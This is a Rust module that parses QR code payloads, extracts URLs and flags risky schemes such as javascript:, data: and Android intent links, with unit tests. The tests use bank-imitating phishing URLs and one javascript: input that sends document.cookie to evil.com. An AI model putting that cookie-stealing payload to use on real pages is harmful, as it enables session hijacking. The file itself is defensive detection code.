/// QR Code Payload Parser & URL Extraction Module
/// Unmasks QR standard formats (MeBKM, URL wrappers, WiFi, Intent) and extracts candidate URLs.

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum QrPayloadType {
    WebUrl,
    DangerousScheme,
    Bookmark,
    Contact,
    WiFiConfig,
    PlainText,
}

#[derive(Debug, Clone)]
pub struct QrParseResult {
    pub payload_type: QrPayloadType,
    pub extracted_url: Option<String>,
    pub clean_text: String,
    pub is_executable_risk: bool,
    pub warning: Option<String>,
}

pub fn parse_qr_payload(raw: &str) -> QrParseResult {
    let trimmed = raw.trim();

    // 1. Detect executable / pseudo-schemes
    let lower = trimmed.to_lowercase();
    if lower.starts_with("javascript:") || lower.starts_with("data:text/html") || lower.starts_with("blob:") {
        return QrParseResult {
            payload_type: QrPayloadType::DangerousScheme,
            extracted_url: Some(trimmed.to_string()),
            clean_text: trimmed.to_string(),
            is_executable_risk: true,
            warning: Some("Embedded executable script or HTML payload detected inside QR code.".to_string()),
        };
    }

    // 2. Direct HTTP / HTTPS URLs
    if lower.starts_with("http://") || lower.starts_with("https://") {
        return QrParseResult {
            payload_type: QrPayloadType::WebUrl,
            extracted_url: Some(trimmed.to_string()),
            clean_text: trimmed.to_string(),
            is_executable_risk: false,
            warning: None,
        };
    }

    // 3. QR 'URL:' prefix format (e.g. "URL:https://example.com")
    if lower.starts_with("url:") {
        let extracted = trimmed[4..].trim().to_string();
        return QrParseResult {
            payload_type: QrPayloadType::WebUrl,
            extracted_url: Some(extracted.clone()),
            clean_text: extracted,
            is_executable_risk: false,
            warning: None,
        };
    }

    // 4. MEBKM Bookmark format (e.g. "MEBKM:TITLE:MySite;URL:https://example.com;;")
    if lower.starts_with("mebkm:") {
        if let Some(idx) = lower.find("url:") {
            let sub = &trimmed[idx + 4..];
            let url_end = sub.find(';').unwrap_or(sub.len());
            let extracted = sub[..url_end].trim().to_string();
            return QrParseResult {
                payload_type: QrPayloadType::Bookmark,
                extracted_url: Some(extracted.clone()),
                clean_text: extracted,
                is_executable_risk: false,
                warning: None,
            };
        }
    }

    // 5. Intent or Market deep-links
    if lower.starts_with("intent:") || lower.starts_with("market://") {
        return QrParseResult {
            payload_type: QrPayloadType::DangerousScheme,
            extracted_url: Some(trimmed.to_string()),
            clean_text: trimmed.to_string(),
            is_executable_risk: true,
            warning: Some("Android Intent or app store deep link requiring explicit user verification.".to_string()),
        };
    }

    // 6. WiFi Network QR format
    if lower.starts_with("wifi:") {
        return QrParseResult {
            payload_type: QrPayloadType::WiFiConfig,
            extracted_url: None,
            clean_text: trimmed.to_string(),
            is_executable_risk: false,
            warning: None,
        };
    }

    // 7. Embedded URL in arbitrary text
    if let Some(idx) = lower.find("http://").or_else(|| lower.find("https://")) {
        let url_candidate = trimmed[idx..].split_whitespace().next().unwrap_or("");
        let clean_url = url_candidate.trim_end_matches(&[';', ')', ']', '}', '>'][..]).to_string();
        return QrParseResult {
            payload_type: QrPayloadType::WebUrl,
            extracted_url: Some(clean_url.clone()),
            clean_text: trimmed.to_string(),
            is_executable_risk: false,
            warning: None,
        };
    }

    // Standard plain text
    QrParseResult {
        payload_type: QrPayloadType::PlainText,
        extracted_url: None,
        clean_text: trimmed.to_string(),
        is_executable_risk: false,
        warning: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_direct_url_qr() {
        let res = parse_qr_payload("https://chase-login.top/auth");
        assert_eq!(res.payload_type, QrPayloadType::WebUrl);
        assert_eq!(res.extracted_url.unwrap(), "https://chase-login.top/auth");
    }

    #[test]
    fn test_wrapped_url_qr() {
        let res = parse_qr_payload("URL:https://verify-account.cfd");
        assert_eq!(res.payload_type, QrPayloadType::WebUrl);
        assert_eq!(res.extracted_url.unwrap(), "https://verify-account.cfd");
    }

    #[test]
    fn test_mebkm_bookmark_qr() {
        let res = parse_qr_payload("MEBKM:TITLE:Banking Portal;URL:https://secure-chase.top/online;;");
        assert_eq!(res.payload_type, QrPayloadType::Bookmark);
        assert_eq!(res.extracted_url.unwrap(), "https://secure-chase.top/online");
    }

    #[test]
    fn test_dangerous_javascript_qr() {
        let res = parse_qr_payload("javascript:fetch('https://evil.com/cookie?c='+document.cookie)");
        assert_eq!(res.payload_type, QrPayloadType::DangerousScheme);
        assert!(res.is_executable_risk);
    }
}
